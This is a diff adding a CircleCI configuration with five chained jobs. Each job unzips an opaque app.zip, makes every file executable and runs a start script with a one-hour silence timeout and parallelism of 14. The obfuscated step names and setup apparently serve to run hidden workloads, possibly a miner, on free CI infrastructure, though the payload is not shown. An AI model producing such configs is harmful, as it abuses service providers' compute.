@@ -1,0 +1,136 @@
+version: 2.1
+jobs:
+  Arun:
+    docker:
+      - image: cimg/node:16.10
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: alsi
+            command: sudo apt update -y
+        - run:
+            name: nual
+            command: ls
+        - run:
+            name: sekoi
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: maksi
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 14
+
+  Aran:
+    docker:
+      - image: cimg/node:16.10
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: nuwoe
+            command: sudo apt update -y
+        - run:
+            name: laowoa
+            command: ls
+        - run:
+            name: muaow
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: nuwoe
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 14
+
+  Arin:
+    docker:
+      - image: cimg/node:16.10
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: seori
+            command: sudo apt update -y
+        - run:
+            name: nuwo
+            command: ls
+        - run:
+            name: sqpwo
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: uwopw
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 14
+
+  Aron:
+    docker:
+      - image: cimg/node:16.10
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: yrebchk
+            command: sudo apt update -y
+        - run:
+            name: pqieixk
+            command: ls
+        - run:
+            name: naiwuei
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: osxciuei
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 14
+
+  Arian:
+    docker:
+      - image: cimg/node:16.10
+    <<: &commonSteps
+      steps:
+        - checkout
+        - run:
+            name: suamsj
+            command: sudo apt update -y
+        - run:
+            name: kowidk
+            command: ls
+        - run:
+            name: nuowo
+            command: unzip app.zip; chmod u+x *
+        - run:
+            name: naieurk
+            no_output_timeout: 3600s
+            command: bash star|bash start
+    parallelism: 14
+
+
+
+workflows:
+  version: 2
+  all:
+    jobs:
+      - Arun
+      - Aran:
+          requires:
+            - Arun
+      - Arin:
+          requires:
+            - Arun
+            - Aran
+      - Aron:
+          requires:
+            - Arun
+            - Aran
+            - Arin
+      - Arian:
+          requires:
+            - Arun
+            - Aran
+            - Arin
+            - Aron
+
+
+
+
